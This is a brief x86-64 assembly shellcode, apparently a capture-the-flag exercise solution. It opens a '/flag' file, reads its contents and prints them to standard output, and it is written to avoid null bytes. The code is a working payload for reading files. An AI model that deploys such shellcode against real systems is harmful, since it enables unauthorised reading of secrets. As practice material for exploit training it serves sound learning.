.intel_syntax noprefix
_start:

    mov al,2
    xor rsi,rsi
    xor rdi,rdi
    ; pushin the flag to the stack in rbx 
    ; it need to be cut to two halfs  for no null bytes
    mov ebx,0x67616c66
    shl rbx,8
    mov bl,0x2f
    push rbx
    mov rdi,rsp
    syscall

    mov rdi,rax
    xor rax,rax
    mov rsi,rsp
    mov dl,0xff
    syscall

    mov al,1
    mov dil,1
    syscall 

    mov al,60
    syscall

